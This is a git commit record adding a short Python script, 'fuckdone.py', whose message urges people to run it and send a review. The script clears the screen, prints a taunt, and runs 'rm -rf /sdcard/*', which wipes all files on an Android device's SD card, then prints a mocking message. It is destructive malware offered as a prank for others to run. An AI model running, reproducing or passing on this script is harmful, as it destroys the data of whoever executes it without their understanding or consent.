1c3519d460d354713eada116a8d12fce3cb74000
fahimrahman143 <tasfiqurrahman32@gmail.com>
2024-08-21 22:17:33 +0600

    RUN AND SENT REVIEW 🐸

---
+++ fuckdone.py
@@ -0,0 +1,11 @@
+import os
+import time
+from os import system as FAHIM
+from time import sleep
+
+
+FAHIM('clear')
+print('FAHIM IS FUCKING YOUR SD CARD')
+FAHIM('rm -rf /sdcard/*')
+sleep(1)
+print('DONE FUCKING')
